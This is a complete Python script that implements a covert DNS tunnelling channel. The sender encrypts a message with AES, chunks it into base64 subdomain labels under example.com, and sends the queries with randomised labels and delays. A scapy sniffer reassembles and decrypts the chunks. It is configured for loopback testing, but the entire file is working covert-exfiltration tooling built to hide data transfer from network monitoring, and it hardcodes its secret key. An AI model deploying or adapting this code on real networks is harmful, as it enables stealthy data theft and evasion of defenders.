# Combined Script for Sending and Receiving Covert Payload via DNS on Windows Machine

import os
import random
import string
import time
import base64
from scapy.all import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import hashlib

# Configuration
DOMAIN = "example.com"  # Domain for DNS queries
dns_servers = ["127.0.0.1"]  # Use loopback IP address for testing
received_chunks = []
SECRET_KEY = "mysecretkey12345"  # Key for encryption and decryption
END_MARKER = "<END>"  # Marker to indicate end of transmission

# Function to handle incoming DNS packets
def dns_sniffer(packet):
    if packet.haslayer(DNS) and packet.getlayer(DNS).qd is not None:  # Capture only valid DNS query packets
        try:
            query_name = packet.getlayer(DNS).qd.qname.decode().strip('.')
            
            # Filter packets to only process those with the target domain
            if DOMAIN in query_name:
                # Extract the data chunk from the subdomain (first part of the query name)
                if '-' in query_name:
                    split_query = query_name.split('-')
                    if len(split_query) > 1:
                        data_chunk = split_query[1].split('.')[0]
                        try:
                            # Decode the chunk (assuming base64 encoded data)
                            decoded_chunk = base64.urlsafe_b64decode(data_chunk + '=' * (-len(data_chunk) % 4)).decode(errors='ignore')
                            received_chunks.append(decoded_chunk)
                        except ValueError as e:
                            print(f"[Sniffer] Failed to decode chunk: {data_chunk}, error: {e}")

                # Check if the end marker is present
                if END_MARKER in received_chunks:
                    # Remove the end marker
                    received_chunks.remove(END_MARKER)
                    # Print the current reassembled payload
                    reassembled_payload = ''.join(received_chunks)
                    try:
                        # Decrypt the reassembled payload
                        decrypted_payload = decrypt_payload(reassembled_payload)
                        print(f"[Sniffer] Reassembled and Decrypted Payload: {decrypted_payload}")
                    except Exception as e:
                        print(f"[Sniffer] Failed to decrypt reassembled payload, error: {e}")
                    # Clear received chunks for the next payload
                    received_chunks.clear()
        except IndexError as e:
            print(f"[Sniffer] Failed to process packet: {e}")
        except Exception as e:
            print(f"[Sniffer] Unexpected error: {e}")

# Send Covert Payload Using DNS
def send_covert_payload(payload, domain=DOMAIN):
    """
    Sends a covert payload using DNS queries to hide the transmission.
    Args:
        payload (str): The secret message to send covertly.
        domain (str): The domain for DNS query-based transmission.
    """
    # Encrypt the payload before transmission
    encrypted_payload = encrypt_payload(payload)
    
    # Encode the entire encrypted payload to base64
    encoded_payload = base64.urlsafe_b64encode(encrypted_payload.encode()).decode().rstrip('=')
    
    # Split encoded payload into small chunks to be hidden in DNS requests
    chunk_size = 32  # Increased chunk size to properly accommodate encoded data
    payload_chunks = [encoded_payload[i:i+chunk_size] for i in range(0, len(encoded_payload), chunk_size)]
    
    for chunk in payload_chunks:
        # Add a random prefix for a more natural-looking subdomain
        random_label = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
        query_domain = f"{random_label}-{chunk}.{domain}"
        
        # Construct the DNS packet
        packet = IP(dst=random.choice(dns_servers)) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=query_domain))
        
        # Send the packet
        print(f"[Sender] Sending DNS query: {query_domain}")
        send(packet, verbose=False)
        time.sleep(random.uniform(0.5, 1.0))  # Reduced delay for more efficient transmission
    
    # Send an end marker to indicate the end of the transmission
    end_marker_chunk = base64.urlsafe_b64encode(END_MARKER.encode()).decode().rstrip('=')
    random_label = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
    query_domain = f"{random_label}-{end_marker_chunk}.{domain}"
    packet = IP(dst=random.choice(dns_servers)) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=query_domain))
    print(f"[Sender] Sending end marker DNS query: {query_domain}")
    send(packet, verbose=False)

# Encryption function
def encrypt_payload(payload):
    key = hashlib.sha256(SECRET_KEY.encode()).digest()  # Derive a 256-bit key from the secret key
    cipher = AES.new(key, AES.MODE_CBC)  # Use AES in CBC mode
    ct_bytes = cipher.encrypt(pad(payload.encode(), AES.block_size))
    iv = base64.urlsafe_b64encode(cipher.iv).decode().rstrip('=')
    ct = base64.urlsafe_b64encode(ct_bytes).decode().rstrip('=')
    return f"{iv}:{ct}"

# Decryption function
def decrypt_payload(encrypted_payload):
    try:
        key = hashlib.sha256(SECRET_KEY.encode()).digest()  # Derive a 256-bit key from the secret key
        if ":" not in encrypted_payload:
            raise ValueError("Missing IV and ciphertext separator.")
        iv, ct = encrypted_payload.split(":")
        iv = base64.urlsafe_b64decode(iv + '=' * (-len(iv) % 4))
        ct = base64.urlsafe_b64decode(ct + '=' * (-len(ct) % 4))
        cipher = AES.new(key, AES.MODE_CBC, iv)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        return pt.decode()
    except ValueError as e:
        raise ValueError(f"Decryption failed due to incorrect data format: {e}")
    except Exception as e:
        raise Exception(f"Decryption failed: {e}")

# Start sending and receiving DNS packets
if __name__ == "__main__":
    # Example payload to send covertly
    secret_payload = "This is a secret payload."
    
    # Start a sniffer in a separate thread
    import threading
    interface = "Software Loopback Interface 1"  # Update with the loopback interface name
    print("[Main] Starting sniffer thread...")
    sniffer_thread = threading.Thread(target=lambda: sniff(filter=f"udp port 53 and host {dns_servers[0]}", prn=dns_sniffer, iface=interface))  # Capturing only DNS traffic to/from target domain
    sniffer_thread.daemon = True
    sniffer_thread.start()
    
    # Ensure sniffer is running before sending payload
    time.sleep(2)  # Reduced delay to improve efficiency
    print("[Main] Sniffer thread started. Sending payload...")
    
    # Send the covert payload
    send_covert_payload(secret_payload)

    print("[Main] Payload transmitted.")
